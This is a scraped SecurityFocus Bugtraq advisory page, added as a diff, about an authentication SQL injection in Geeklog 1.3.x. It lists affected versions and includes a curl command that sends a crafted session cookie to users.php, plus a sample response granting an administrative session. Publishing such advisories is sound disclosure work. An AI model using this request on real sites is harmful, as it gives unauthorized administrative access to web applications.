@@ -1,0 +1,166 @@
+#SpeeDr00t@Black Falcon<br>#bid7742<p><b><span style="font-size: 18pt;">Geeklog Authentication SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/7742/info">info</a><br><a href="http://www.securityfocus.com/bid/7742/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/7742/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/7742/solution">solution</a><br><a href="http://www.securityfocus.com/bid/7742/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				7742
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 29 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 29 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to pokleyzz &lt;pokleyzz@scan-associates.net&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Geeklog Geeklog 1.3.7  sr1<br/>
+					
+				
+					Geeklog Geeklog 1.3.7 <br/>
+					
+				
+					Geeklog Geeklog 1.3.5  sr2<br/>
+					
+				
+					Geeklog Geeklog 1.3.5  sr1<br/>
+					
+				
+					Geeklog Geeklog 1.3.5 <br/>
+					
+				
+					Geeklog Geeklog 1.3 <br/>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.22 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.20 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.20 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.19 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.19 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.18 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.18 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.17 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Apache Apache 1.3.17 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Geeklog Geeklog 1.3.7  sr2<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example was submitted:<br/><br/>curl -b geeklog=2.1 -D header.txt http://www.example.com/users.php<br/><br/>header.txt contains valid session information for the administrative user:<br/><br/>----------------header.txt -------------------------<br/><br/>HTTP/1.1 200 OK<br/>Date: Sat, 17 May 2003 16:15:23 GMT<br/>Server: Apache<br/>Set-Cookie: gl_session=1828197392; path=/<br/>Set-Cookie: LastVisit=1053188123; expires=Sun, 16-May-2004 16:15:23 GMT;<br/>path=/<br/>Set-Cookie: LastVisitTemp=deleted; expires=Fri, 17-May-2002 16:15:22<br/>GMT; path=/; domain=http://www.example.com<br/>Transfer-Encoding: chunked<br/>Content-Type: text/html; charset=iso-8859-1<br/><br/>10<br/>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br/><br/><br/>----------------header.txt --------------------------
+	
+		<ul>
+</ul>
+</div>
